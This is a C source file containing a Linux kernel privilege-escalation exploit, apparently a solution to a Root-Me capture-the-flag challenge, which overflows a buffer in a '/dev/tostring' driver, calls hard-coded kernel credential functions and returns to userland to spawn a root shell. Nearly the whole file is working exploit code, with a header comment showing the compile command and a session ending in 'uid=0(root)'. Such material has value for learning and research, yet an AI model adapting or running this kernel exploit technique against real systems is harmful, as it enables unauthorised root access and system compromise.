/*
    On a linux machine:
    vagrant@ubuntu-focal:~$ gcc -o exploit stack_overflow.c -m32 -static -mtune=i686   

    On the target vm:
    Root-Me user@linkern-chall:~$ cd /mnt/share
    Root-Me user@linkern-chall:/mnt/share$ ./exploit
    [+] Saved state
    [+] Filling the buffer
    [+] Overwritting tostring.tostring_read with 0x8049d9d
    [+] Triggering tostring.tostring_read()
    [+] Enjoy your shell
    /mnt/share # id
    uid=0(root) gid=0
    /mnt/share #
   
 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

#define DEV "/dev/tostring"

int trigger(int fd);
void shell();
void save_state();
void root_creds();

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_eflags;
unsigned long shell_addr;

void save_state() {
  __asm(
    "pushl %cs;"
    "popl user_cs;"
    "pushfl;"
    "popl user_eflags;"
    "pushl %esp;"
    "popl user_sp;"
    "pushl %ss;"
    "popl user_ss;"
  );
  puts("[+] Saved state");
}

void root_creds() {
  __asm(
    ".intel_syntax noprefix;"
    "xor eax, eax;"
    "call 0xc10711f0;"
    "call 0xc1070e80;"
    "push user_ss;"
    "push user_sp;"
    "push user_eflags;"
    "push user_cs;"
    "push shell_addr;"
    "iret;"
    ".att_syntax;"
  );
}

void shell(){
    char *shell = "/bin/sh";
    char *args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);
}

int trigger(int fd) { 
    save_state();
    char b[32];
   
    unsigned long *shellcode_addr = (unsigned long*)malloc(4);  
    *shellcode_addr = (unsigned long)root_creds;
    
    shell_addr = (unsigned long)&shell;

    puts("[+] Filling the buffer");
    for (int i = 0; i < 0x60; i++) {
      if (write(fd, shellcode_addr, 4) < 0 ) {
        perror("[!] Failed to write in stack");
        return errno;
      }
    }
    
    printf("[+] Overwritting tostring.tostring_read with 0x%lx\n", *shellcode_addr);
    printf("[+] Triggering tostring.tostring_read()\n");
    printf("[+] Enjoy your shell\n");

    if (read(fd, b, 32) < 0) {
      return errno;
    }

    return 0;
}

int main(void) {
    int fd;

    fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("[!] Failed to open device");
        return -1;
    }

    if (trigger(fd) < 0) {
      perror("[!] Failed to trigger null pointer deref");
      return -1;
    }

    close(fd);
    return 0;
}

